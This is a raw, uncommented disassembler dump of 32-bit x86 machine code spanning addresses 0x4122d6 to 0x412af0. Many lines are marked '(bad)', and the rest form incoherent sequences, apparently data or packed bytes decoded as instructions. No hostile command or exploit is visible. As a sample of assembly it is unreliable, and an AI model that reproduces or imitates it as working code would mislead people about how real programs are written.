  4122d6:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4122dc:	push   0xffffffff
  4122de:	and    bh,bh
  4122e0:	pop    ecx
  4122e1:	inc    eax
  4122e2:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4122e8:	push   0xffffff8b
  4122ea:	pop    ecx
  4122eb:	cld    
  4122ec:	dec    ebp
  4122ed:	lea    ecx,[ecx+0x45ff08ff]
  4122f3:	mov    BYTE PTR [edx+0x1],cl
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	mov    DWORD PTR [ebp+0x8],0x58008d
  4122ff:	dec    DWORD PTR [ebp-0x77]
  412302:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  412309:	cld    
  41230a:	dec    ebp
  41230b:	jne    0x412340
  41230d:	lea    eax,[ebx]
  41230f:	push   eax
  412310:	mov    edi,edi
  412312:	or     BYTE PTR [ecx+0x54a845],cl
  412318:	add    al,ch
  41231a:	(bad)  
  41231b:	sub    esp,ebp
  41231d:	add    BYTE PTR [eax],al
  41231f:	rol    BYTE PTR [eax],0x84
  412322:	inc    ebp
  412323:	add    dh,BYTE PTR [esi+0x0]
  412326:	add    BYTE PTR [ebp-0x73],al
  412329:	mov    ebp,DWORD PTR [esp+edx*4]
  41232c:	inc    DWORD PTR [eax]
  41232e:	lea    ecx,[ebx-0x30074f4]
  412334:	call   0x422eb9
  412339:	add    BYTE PTR [ebp+0x0],cl
  41233c:	jne    0x41237f
  41233e:	dec    DWORD PTR [ebx-0x76210314]
  412344:	dec    ebp
  412345:	add    DWORD PTR [ebp+0x0],esi
  412348:	(bad)  
  412349:	xchg   ebp,eax
  41234a:	loopne 0x41234b
  41234c:	inc    eax
  41234d:	inc    DWORD PTR [eax]
  41234f:	mov    ecx,DWORD PTR [ebp-0x4]
  412352:	xor    edx,DWORD PTR [edx+0x7201b8]
  412358:	add    BYTE PTR [edx],dl
  41235a:	enter  0x4d90,0x0
  41235e:	mov    eax,DWORD PTR [eax]
  412360:	hlt    
  412361:	add    al,0xa5
  412363:	mov    al,0xff
  412365:	add    bh,bh
  412367:	add    BYTE PTR [ebx],dh
  412369:	inc    DWORD PTR [ebx]
  41236b:	sbb    al,0x89
  41236d:	jne    0x412347
  41236f:	mov    esp,DWORD PTR [ecx+0x4500fc]
  412375:	mov    eax,DWORD PTR [ebp-0xff0048]
  41237b:	mov    DWORD PTR [eax-0x70],0xee58ed89
  412382:	inc    DWORD PTR [ebp-0x75]
  412385:	fisttp QWORD PTR [eax+eiz*8]
  412388:	test   DWORD PTR [esi-0x1],esp
  41238b:	inc    ebp
  41238c:	(bad)  
  41238d:	aas    
  41238e:	inc    ebp
  41238f:	(bad)  
  412390:	lea    edi,[esp+eiz*2-0x1]
  412394:	inc    edi
  412396:	mov    DWORD PTR ds:0x8000c7a0,edi
  41239c:	mov    ebp,esi
  41239e:	cld    
  41239f:	in     al,0x8d
  4123a1:	inc    ebp
  4123a2:	jmp    eax
  4123a4:	(bad)  
  4123a5:	fisttp WORD PTR [eax+0x8801c7]
  4123ab:	jecxz  0x4123f2
  4123ad:	out    dx,al
  4123ae:	inc    DWORD PTR [ebp-0x4]
  4123b1:	out    0x8d,eax
  4123b3:	aas    
  4123b4:	inc    edi
  4123b6:	jmp    FWORD PTR [eax-0x78]
  4123b9:	inc    DWORD PTR [ecx]
  4123bb:	mov    DWORD PTR [eax],0xc7a83d
  4123c1:	ins    BYTE PTR es:[edi],dx
  4123c2:	test   edi,edi
  4123c4:	pandn  mm0,mm5
  4123c7:	aas    
  4123c8:	add    bh,al
  4123ca:	mov    esi,DWORD PTR [eax-0x4]
  4123cd:	inc    DWORD PTR [eax+0xdf01e0]
  4123d3:	(bad)  
  4123d4:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4123d8:	mov    ebp,ebx
  4123da:	xchg   esp,eax
  4123db:	fild   DWORD PTR [eax]
  4123dd:	(bad)  
  4123de:	mov    edi,DWORD PTR [eax+0x3]
  4123e1:	(bad)  
  4123e2:	cmp    al,0xe7
  4123e4:	dec    ebp
  4123e5:	leave  
  4123e6:	mov    ebp,eax
  4123e8:	fsubr  DWORD PTR [ecx]
  4123ea:	add    BYTE PTR [eax],al
  4123ec:	lea    ecx,[ebx-0x7f0003b4]
  4123f2:	push   edx
  4123f3:	add    DWORD PTR [ebp+0x0],edx
  4123f6:	mov    esi,DWORD PTR [eax]
  4123f8:	mov    WORD PTR [ebx-0x7a750000],?
  4123fe:	add    esi,DWORD PTR [ebp-0x78]
  412401:	mov    eax,DWORD PTR [eax]
  412403:	cld    
  412404:	push   0x7d
  412406:	dec    DWORD PTR [ebx+0xd88c]
  41240c:	push   edx
  41240d:	mov    edx,DWORD PTR [ecx-0x4]
  412410:	call   DWORD PTR [eax+0x7d01fc]
  412416:	mov    ebx,edx
  412418:	cld    
  412419:	add    BYTE PTR [eax+0x560150],dl
  41241f:	test   DWORD PTR [ebp+0x75],eax
  412422:	in     al,0x8b
  412424:	in     al,dx
  412425:	cld    
  412426:	(bad)  
  412427:	jge    0x4123bd
  412429:	mov    esp,ebx
  41242b:	fsub   st,st(7)
  41242d:	add    bh,al
  41242f:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  412435:	add    edi,edi
  412437:	add    bh,bh
  412439:	mov    eax,0x50d800ed
  41243e:	inc    ebp
  41243f:	push   esi
  412440:	fisttp WORD PTR [ebx+0x4dc7f43f]
  412446:	test   BYTE PTR [ebx],dh
  412448:	fadd   DWORD PTR ds:0x4572c2
  41244e:	jmp    0x412411
  412450:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  412457:	inc    esi
  412458:	jo     0x41245a
  41245a:	test   edi,eax
  41245c:	jmp    esp
  41245e:	inc    DWORD PTR [eax]
  412460:	in     eax,dx
  412461:	add    al,bl
  412463:	jne    0x4123ea
  412465:	mov    edi,edi
  412467:	cld    
  412468:	inc    DWORD PTR [ebp-0x12]
  41246b:	mov    esp,esp
  41246d:	mov    ah,0x85
  41246f:	add    bh,bh
  412471:	call   0x1194d75
  412476:	ret    0x858b
  412479:	cld    
  41247a:	inc    DWORD PTR [eax+0xe301ff]
  412480:	out    dx,al
  412481:	xor    BYTE PTR [ebp-0xff00cf],al
  412487:	mov    ebx,ebp
  412489:	cld    
  41248a:	jo     0x412415
  41248c:	or     DWORD PTR [ecx],eax
  41248e:	add    BYTE PTR [eax],al
  412490:	push   eax
  412491:	add    DWORD PTR [ebp+0x45],eax
  412494:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  41249a:	dec    DWORD PTR [ebx-0x3fda0318]
  4124a0:	add    BYTE PTR [ebp-0xbf0040],dl
  4124a6:	inc    ebp
  4124a7:	or     BYTE PTR [ebx-0x4faf0400],0x45
  4124ae:	add    DWORD PTR [ebx+0x459c00],ecx
  4124b4:	mov    edi,edi
  4124b6:	mov    eax,0xe80800ff
  4124bb:	inc    ebp
  4124bc:	sub    BYTE PTR [ebx-0x47000400],cl
  4124c2:	add    al,0x1
  4124c4:	rol    BYTE PTR [eax],0x1e
  4124c7:	jne    0x41250e
  4124c9:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4124cf:	inc    DWORD PTR [ecx]
  4124d1:	call   0x864cd6
  4124d6:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4124dc:	call   0x414ce2
  4124e1:	xor    bh,bh
  4124e3:	push   edi
  4124e4:	adc    BYTE PTR [ebx-0x747423bb],al
  4124ea:	loopne 0x4124c8
  4124ec:	ret    
  4124ed:	loopne 0x41248b
  4124ef:	xor    DWORD PTR [edx],0x31
  4124f2:	cmp    edi,edi
  4124f4:	bswap  esp
  4124f6:	rol    BYTE PTR gs:[eax],0x5
  4124fa:	jmp    0x12c2644
  4124ff:	mov    eax,DWORD PTR [ebp-0x4]
  412502:	add    BYTE PTR [eax+0xff0100],bh
  412508:	cld    
  412509:	jne    0x412588
  41250b:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  412511:	push   ss
  412512:	add    DWORD PTR [eax],eax
  412514:	add    BYTE PTR [eax+0x7f],dl
  412517:	inc    ebp
  412518:	add    BYTE PTR [ebx+0x459850],cl
  41251e:	mov    edi,edi
  412520:	test   al,0xff
  412522:	add    BYTE PTR [eax],cl
  412524:	inc    DWORD PTR [ebp-0x18]
  412527:	jmp    DWORD PTR ds:0x4d7d00dc
  41252d:	adc    BYTE PTR [ebx+0x459cb9],cl
  412533:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  412539:	pushf  
  41253a:	mov    eax,0x30132
  41253f:	lea    esi,[ebp+0x2c]
  412542:	xor    edi,edi
  412544:	(bad)  
  412545:	call   0x1404cb2
  41254a:	call   0x1354dda
  41254f:	jne    0x4124dc
  412551:	xor    edi,esp
  412553:	add    eax,DWORD PTR [eax+0xc018d]
  412559:	push   DWORD PTR [eax]
  41255b:	call   0xca4cb7
  412560:	int3   
  412561:	inc    DWORD PTR [ebp-0x14]
  412564:	mov    ecx,DWORD PTR [ebp-0x28]
  412567:	xor    eax,DWORD PTR [eax]
  412569:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  41256f:	(bad)  
  412570:	xchg   ebp,eax
  412571:	in     al,0xff
  412573:	add    bh,bh
  412575:	add    BYTE PTR [ebp+0x45],dl
  412578:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  41257e:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  412585:	mov    edi,edi
  412587:	or     BYTE PTR [eax],cl
  412589:	inc    ebp
  41258a:	test   DWORD PTR gs:[eax],eax
  41258d:	je     0x4125d4
  41258f:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  412595:	xor    edx,DWORD PTR [eax-0x73]
  412598:	push   ebp
  412599:	or     BYTE PTR [ebp+0x21007572],al
  41259f:	inc    ebp
  4125a0:	in     al,dx
  4125a1:	mov    ebp,DWORD PTR [eax]
  4125a3:	mov    esp,0x648bc345
  4125a8:	fmul   st,st(5)
  4125aa:	add    BYTE PTR [ebx],ch
  4125ac:	mov    eax,DWORD PTR [ebx]
  4125ae:	cld    
  4125af:	loopne 0x412571
  4125b1:	inc    ebp
  4125b2:	push   ebp
  4125b3:	cmp    ebp,eax
  4125b5:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  4125bc:	cld    
  4125bd:	fadd   DWORD PTR [eax+0x3b014d]
  4125c3:	jne    0x4125f5
  4125c5:	push   0xf8898557
  4125ca:	in     al,dx
  4125cb:	jne    0x412612
  4125cd:	lea    eax,[ebx+0x72e8dcc8]
  4125d3:	das    
  4125d4:	mov    eax,DWORD PTR [eax]
  4125d6:	mov    esp,0x33eb7545
  4125db:	mov    edi,DWORD PTR [edi+0x4572bc]
  4125e1:	xor    eax,edi
  4125e3:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  4125ed:	rcl    BYTE PTR [eax-0x40],1
  4125f0:	inc    ebp
  4125f1:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4125f9:	inc    ebp
  4125fa:	xchg   ebp,eax
  4125fb:	ud0    ebp,DWORD PTR [ebx]
  4125fe:	inc    DWORD PTR [eax]
  412600:	retf   
  412601:	jbe    0x412603
  412603:	mov    dl,BYTE PTR [eax-0x80]
  412606:	push   ebp
  412607:	pop    ds
  412608:	mov    ecx,DWORD PTR [esp+esi*8]
  41260b:	inc    eax
  41260c:	retf   
  41260d:	inc    ebp
  41260e:	iret   
  41260f:	jb     0x4125d9
  412611:	mov    eax,DWORD PTR [edi]
  412613:	enter  0x4545,0x1
  412617:	xor    DWORD PTR [eax],eax
  412619:	pushf  
  41261a:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  412620:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  412627:	dec    ebp
  412628:	add    BYTE PTR [ebx],dh
  41262a:	inc    ebp
  41262b:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  412631:	xor    dl,BYTE PTR [edx]
  412633:	add    eax,DWORD PTR [ebp-0x77]
  412636:	mov    eax,esp
  412638:	fmul   DWORD PTR [ebp-0x3d]
  41263b:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  412642:	mov    DWORD PTR [ebp-0x28],eax
  412645:	rol    DWORD PTR [ebp-0x64],1
  412648:	xor    eax,edi
  41264a:	mov    ecx,0xff858db0
  41264f:	clc    
  412650:	enter  0x4d45,0x32
  412654:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  41265b:	test   esi,edi
  41265d:	clc    
  41265e:	inc    DWORD PTR [ebp+0x45]
  412661:	cmp    al,0x8b
  412663:	pushf  
  412664:	or     bh,al
  412666:	enter  0x16a8,0x85
  41266a:	xor    eax,edi
  41266c:	pushf  
  41266d:	inc    ebp
  41266e:	(bad)  
  41266f:	ds cld 
  412671:	pushf  
  412672:	inc    ebp
  412673:	mov    edx,DWORD PTR [eax-0x28]
  412676:	lock push ebp
  412678:	add    BYTE PTR [ebx],dh
  41267a:	mov    DWORD PTR [ebx],eax
  41267c:	sar    BYTE PTR [ebx],1
  41267e:	adc    BYTE PTR [edi],cl
  412680:	dec    ebp
  412681:	adc    al,0x8b
  412683:	add    al,dl
  412685:	jmp    0x1022855
  41268a:	jb     0x4126d9
  41268c:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  412692:	xor    ecx,DWORD PTR [ebp+0x3b]
  412695:	xor    ecx,DWORD PTR [edi]
  412697:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  41269b:	(bad)  
  41269d:	clc    
  41269e:	enter  0x8400,0x8b
  4126a2:	pop    es
  4126a3:	mov    al,0x0
  4126a5:	push   ebp
  4126a6:	push   cs
  4126a7:	xor    ecx,eax
  4126a9:	xor    esp,ecx
  4126ab:	add    ebp,DWORD PTR [eax]
  4126ad:	add    esi,DWORD PTR [eax]
  4126af:	(bad)  
  4126b1:	retf   0x55c8
  4126b4:	repnz mov eax,DWORD PTR [ebp-0x10]
  4126b8:	(bad)  
  4126b9:	cli    
  4126ba:	fdivr  st,st(1)
  4126bc:	test   DWORD PTR [eax+edi*8],ecx
  4126bf:	dec    ebp
  4126c0:	inc    ebp
  4126c1:	xor    edi,DWORD PTR [eax-0x7167afd]
  4126c7:	add    BYTE PTR [ebp+0x0],al
  4126ca:	mov    ecx,DWORD PTR [ebp-0x28]
  4126cd:	mov    ecx,ebx
  4126cf:	clc    
  4126d0:	jne    0x41269d
  4126d2:	mov    esi,0xd672d3
  4126d7:	into   
  4126d8:	into   
  4126d9:	scas   eax,DWORD PTR es:[edi]
  4126da:	dec    ebp
  4126db:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4126e1:	sub    ecx,esi
  4126e3:	cmp    ecx,DWORD PTR [ebp+0x77]
  4126e6:	(bad)  
  4126e7:	mov    edi,eax
  4126e9:	mov    al,0x85
  4126eb:	mov    eax,edi
  4126ed:	add    BYTE PTR [ebp-0x75],al
  4126f0:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4126f7:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4126fd:	(bad)  
  4126ff:	retf   0x559c
  412702:	(bad)  
  412703:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  41270a:	inc    ebp
  41270b:	add    eax,0xeb9c4d3f
  412710:	(bad)  
  412711:	mov    ecx,esp
  412713:	lods   al,BYTE PTR ds:[esi]
  412714:	test   DWORD PTR [ebp-0x8],edx
  412717:	xor    ecx,DWORD PTR [ebp+0x33]
  41271a:	mov    eax,DWORD PTR [ebx]
  41271c:	lock add ecx,ebx
  41271f:	bswap  esi
  412721:	retf   0x55d1
  412724:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  41272a:	jmp    0x412725
  41272c:	add    BYTE PTR ds:0xebc44d8b,al
  412732:	push   ebp
  412733:	mov    ebp,DWORD PTR [ebx]
  412735:	test   al,0x8b
  412737:	push   ebp
  412738:	clc    
  412739:	xor    ecx,ebx
  41273b:	xor    ecx,esi
  41273d:	add    edx,ecx
  41273f:	add    eax,DWORD PTR [edx+0xca010f]
  412745:	push   ebp
  412746:	dec    ebp
  412747:	mov    ecx,DWORD PTR [ebx-0x34050710]
  41274d:	stc    
  41274e:	rol    DWORD PTR ds:0xebce4dd6,cl
  412754:	scas   eax,DWORD PTR es:[edi]
  412755:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  41275b:	xor    ebp,DWORD PTR [ebx]
  41275d:	xor    edi,DWORD PTR [ebx]
  41275f:	add    esi,DWORD PTR [edi+0x3]
  412762:	mov    ecx,DWORD PTR [edi]
  412764:	clc    
  412765:	retf   0x55cb
  412768:	into   
  412769:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  412770:	mov    eax,0x3376554d
  412775:	mov    esi,DWORD PTR [ebx]
  412777:	int3   
  412778:	add    edx,DWORD PTR [ebp+0x3]
  41277b:	xor    ecx,DWORD PTR [edi]
  41277d:	xor    ecx,edx
  41277f:	add    edx,DWORD PTR [ebp+0x3]
  412782:	mov    ecx,DWORD PTR [edi]
  412784:	lock retf 0x4dfa
  412788:	stc    
  412789:	mov    ecx,DWORD PTR [eax]
  41278b:	or     BYTE PTR [ebp+0x4d],cl
  41278e:	jmp    0x105281e
  412793:	dec    ebp
  412794:	dec    ebp
  412795:	(bad)  
  412796:	mov    ebx,esp
  412798:	clc    
  412799:	test   ebx,ecx
  41279b:	clc    
  41279c:	ror    DWORD PTR [ebp-0x2a],cl
  41279f:	mov    esi,ecx
  4127a1:	call   0x33cc6d55
  4127a6:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  4127ad:	retf   
  4127ae:	ja     0x41277e
  4127b0:	mov    ebp,DWORD PTR [eax-0x48]
  4127b3:	dec    ebp
  4127b4:	xor    ecx,DWORD PTR [di+0x3]
  4127b8:	mov    esp,esp
  4127ba:	clc    
  4127bb:	push   ebp
  4127bc:	retf   
  4127bd:	mov    dl,bl
  4127bf:	adc    esi,edx
  4127c1:	jb     0x412791
  4127c3:	add    BYTE PTR [edi-0x3b7474b3],ch
  4127c9:	call   0x4d6cf34b
  4127ce:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4127d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d5:	pushf  
  4127d6:	inc    ebp
  4127d7:	xor    cl,BYTE PTR [ebp-0x78]
  4127da:	mov    edx,edi
  4127dc:	clc    
  4127dd:	dec    ebp
  4127de:	retf   
  4127df:	mov    edx,ebx
  4127e1:	call   0x560ffbbc
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4127ed:	pushf  
  4127ee:	sub    esi,DWORD PTR [edx]
  4127f0:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4127f6:	lods   al,BYTE PTR ds:[esi]
  4127f7:	xor    esp,DWORD PTR [ebx]
  4127f9:	add    ecx,DWORD PTR [ebp-0x1c]
  4127fc:	mov    edi,DWORD PTR [ebp-0x8]
  4127ff:	mov    bl,cl
  412801:	cmp    dl,bl
  412803:	jb     0x4127d3
  412805:	add    dh,dl
  412807:	dec    ebp
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  41280f:	shr    DWORD PTR [ebx],cl
  412811:	into   
  412812:	cmp    edx,esi
  412814:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  41281a:	dec    ebp
  41281b:	dec    ebp
  41281c:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  412822:	retf   
  412823:	xor    edx,esi
  412825:	add    ecx,esi
  412827:	imul   ecx,edx
  41282a:	mov    DWORD PTR [ebp+0x8],edx
  41282d:	xor    ecx,DWORD PTR [ebp+0x2b]
  412830:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  412836:	add    esi,DWORD PTR [ebx]
  412838:	mov    ah,0x3
  41283a:	inc    ebp
  41283b:	rdtsc  
  41283d:	xlat   BYTE PTR ds:[ebx]
  41283e:	pushf  
  41283f:	jge    0x4127ca
  412841:	xor    ebx,eax
  412843:	sub    eax,DWORD PTR [ebp-0x73]
  412846:	(bad)  
  412847:	cmp    al,al
  412849:	jb     0x4127d0
  41284b:	add    al,bh
  41284d:	ror    DWORD PTR [ebp-0x7a],1
  412850:	xor    edi,edi
  412852:	add    edi,edi
  412854:	jmp    0x4128a3
  412856:	mov    ecx,DWORD PTR [ebx-0x34341324]
  41285c:	dec    ebp
  41285d:	into   
  41285e:	mov    ebp,DWORD PTR [edi-0x23737428]
  412864:	pushf  
  412865:	shl    DWORD PTR [edx],cl
  412867:	retf   0x5588
  41286a:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412870:	add    eax,DWORD PTR [eax]
  412872:	in     al,0x4d
  412874:	push   ebp
  412875:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  41287b:	fs add ch,cl
  41287e:	dec    ebp
  41287f:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  412885:	dec    ebp
  412886:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  41288c:	jge    0x41285c
  41288e:	mov    BYTE PTR [edi+0xf723b3a],ch
  412894:	add    cl,dh
  412896:	dec    ebp
  412897:	dec    DWORD PTR [ebx-0x2c032375]
  41289d:	adc    BYTE PTR [ebp+0x1],0x8b
  4128a1:	add    al,bl
  4128a3:	jge    0x412831
  4128a5:	push   0xffffff9c
  4128a7:	push   0x8b3032
  4128ac:	shl    BYTE PTR [ebp+0x55],0x6a
  4128b0:	xor    edi,edi
  4128b2:	xor    edx,DWORD PTR [ebx+eax*1]
  4128b5:	inc    ebp
  4128b6:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4128bc:	dec    ebp
  4128bd:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4128c3:	jbe    0x412850
  4128c5:	mov    ebp,esp
  4128c7:	ror    bl,1
  4128c9:	enter  0x14ce,0xaf
  4128cd:	dec    DWORD PTR [ebx-0x2cef17f8]
  4128d3:	push   ebp
  4128d4:	retf   0x5540
  4128d7:	push   ebp
  4128d8:	mov    esi,DWORD PTR [edx-0x1c]
  4128db:	mov    edx,ebx
  4128dd:	cld    
  4128de:	(bad)  
  4128df:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4128e6:	sti    
  4128e7:	add    dh,cl
  4128e9:	push   0xffffff94
  4128eb:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  4128f2:	bswap  esp
  4128f4:	pop    esi
  4128f5:	inc    ebp
  4128f6:	dec    DWORD PTR [ecx+0x45e8c88b]
  4128fc:	push   ebp
  4128fd:	xor    esi,DWORD PTR [ebx]
  4128ff:	mov    DWORD PTR [ebx],0xcac00f9c
  412905:	aas    
  412906:	push   ebp
  412907:	inc    ebp
  412908:	xor    ecx,eax
  41290a:	add    ecx,eax
  41290c:	mov    eax,DWORD PTR [ebx]
  41290e:	(bad)  
  41290f:	jmp    0x41289d
  412911:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  412918:	les    edi,FWORD PTR [esi-0xeccefb3]
  41291e:	mov    edx,0xff378d80
  412923:	mov    dh,0xd1
  412925:	cmp    edx,DWORD PTR [ebp+0xf]
  412928:	mov    eax,DWORD PTR [edx-0x20]
  41292b:	add    BYTE PTR [ebp-0x75],bh
  41292e:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  412935:	pushf  
  412936:	retf   0x8632
  412939:	cmp    ebp,0x8
  41293c:	call   ebx
  41293e:	inc    ebp
  41293f:	inc    ebp
  412940:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  412946:	mov    esi,DWORD PTR [ecx]
  412948:	enter  0x49c,0xc7
  41294c:	add    al,al
  41294e:	add    bl,al
  412950:	(bad)  
  412951:	clc    
  412952:	enter  0x45,0x31
  412956:	push   eax
  412957:	pushf  
  412958:	mov    edi,eax
  41295a:	int3   
  41295b:	or     al,al
  41295d:	test   DWORD PTR [edi],edi
  41295f:	clc    
  412960:	gs inc ebp
  412962:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  412968:	push   ss
  412969:	xor    ecx,DWORD PTR [ebp+0x3]
  41296c:	sub    edx,DWORD PTR [ecx-0x76]
  41296f:	dec    ebp
  412970:	add    DWORD PTR [ebx+0x88d845],ecx
  412976:	mov    esi,DWORD PTR [ebx]
  412978:	or     BYTE PTR [ebx],al
  41297a:	cmp    edx,DWORD PTR [ecx-0x38]
  41297d:	dec    ebp
  41297e:	out    dx,eax
  41297f:	xor    eax,DWORD PTR [ebp+0x3]
  412982:	mov    edx,DWORD PTR [ecx-0x28]
  412985:	dec    ebp
  412986:	add    BYTE PTR [ebx],dh
  412988:	push   0x518003
  41298d:	push   eax
  41298e:	add    BYTE PTR [ebx-0x300748b],cl
  412994:	sbb    BYTE PTR [ebp+0x45],cl
  412997:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  41299d:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4129a3:	dec    ebp
  4129a4:	inc    ebp
  4129a5:	xor    ecx,eax
  4129a7:	add    ecx,eax
  4129a9:	push   ecx
  4129aa:	(bad)  
  4129ab:	dec    ebp
  4129ac:	mov    al,ds:0xc5e03dff
  4129b1:	retf   
  4129b2:	(bad)  
  4129b3:	into   
  4129b4:	sub    bh,bh
  4129b6:	dec    esp
  4129b7:	adc    al,0x9c
  4129b9:	inc    ebp
  4129ba:	push   ebp
  4129bb:	test   DWORD PTR [edi],ecx
  4129bd:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  4129c4:	jmp    0xc9ba38d8
  4129c9:	add    cl,dl
  4129cb:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4129d5:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4129db:	rol    BYTE PTR [eax],0x55
  4129de:	clc    
  4129df:	fs jb  0x4129e9
  4129e2:	mov    eax,DWORD PTR [ebp-0x30]
  4129e5:	xor    al,0x40
  4129e7:	sub    al,0xc7
  4129e9:	mov    ah,ch
  4129eb:	add    DWORD PTR [ebp+0x4534f845],eax
  4129f1:	sub    al,0x86
  4129f3:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4129fa:	mov    ch,0xff
  4129fc:	clc    
  4129fd:	add    DWORD PTR [ebp+0x60],0x3d
  412a01:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  412a08:	inc    ebp
  412a09:	dec    DWORD PTR [ebx-0x341ff701]
  412a0f:	test   esi,ecx
  412a11:	dec    DWORD PTR [ebx-0x7f8a3301]
  412a17:	push   eax
  412a18:	add    DWORD PTR [ebp+0x0],eax
  412a1b:	dec    ebx
  412a1d:	or     al,0xce
  412a1f:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  412a26:	into   
  412a27:	add    BYTE PTR [ebx-0x34ff1400],cl
  412a2d:	mov    esi,ecx
  412a2f:	sar    bh,0x45
  412a32:	adc    al,0x8b
  412a34:	clc    
  412a35:	fadd   DWORD PTR [ebp+0x0]
  412a38:	mov    ebp,DWORD PTR [edx+0x8]
  412a3b:	push   edi
  412a3c:	adc    BYTE PTR [eax+0x1],0x83
  412a40:	add    al,al
  412a42:	retf   
  412a43:	mov    ecx,esi
  412a45:	cld    
  412a46:	mov    eax,DWORD PTR [eax+0xcb01cc]
  412a4c:	into   
  412a4d:	add    BYTE PTR [ebx+0x756aec00],cl
  412a53:	jne    0x412a88
  412a55:	inc    DWORD PTR [ebx]
  412a57:	rcl    BYTE PTR [ecx+0x50],1
  412a5a:	push   eax
  412a5b:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  412a61:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  412a68:	sar    bh,0x84
  412a6b:	or     BYTE PTR [ebx],al
  412a6d:	push   eax
  412a6e:	add    BYTE PTR [ebx+0x4532c845],cl
  412a74:	pushf  
  412a75:	xor    edi,eax
  412a77:	pushf  
  412a78:	mov    ah,0x89
  412a7a:	test   eax,ebp
  412a7c:	clc    
  412a7d:	inc    ebp
  412a7e:	inc    ebp
  412a7f:	mov    DWORD PTR [eax+eax*8],esi
  412a82:	sub    al,0x30
  412a84:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  412a8b:	dec    ebp
  412a8c:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a90:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  412a96:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a9a:	or     DWORD PTR [ecx+0x45ff085c],0x0
  412aa1:	shl    DWORD PTR [ebp-0x380064],1
  412aa7:	int3   
  412aa8:	lea    eax,[ebp+0x45fff860]
  412aae:	push   eax
  412aaf:	xor    dh,BYTE PTR [ebp-0x64]
  412ab2:	(bad)  
  412ab3:	(bad)  
  412ab4:	pop    esp
  412ab5:	lods   al,BYTE PTR ds:[esi]
  412ab6:	inc    DWORD PTR [ebp+0x4508f8ff]
  412abc:	mov    edi,DWORD PTR [eax+edx*8]
  412abf:	pushf  
  412ac0:	jo     0x412a89
  412ac2:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  412ac9:	inc    ebp
  412aca:	add    BYTE PTR [esi],bh
  412acc:	push   0x8b809c
  412ad1:	in     al,dx
  412ad2:	inc    ebp
  412ad3:	push   ebp
  412ad4:	mov    esi,DWORD PTR [ebx]
  412ad6:	cld    
  412ad7:	add    eax,DWORD PTR [eax+0xf013b]
  412add:	adc    al,0x0
  412adf:	add    bh,bh
  412ae1:	jmp    0xbe2bfe
  412ae6:	add    BYTE PTR [ebp+0x45],cl
  412ae9:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  412aef:	dec    ebp
  412af0:	push   0x38033
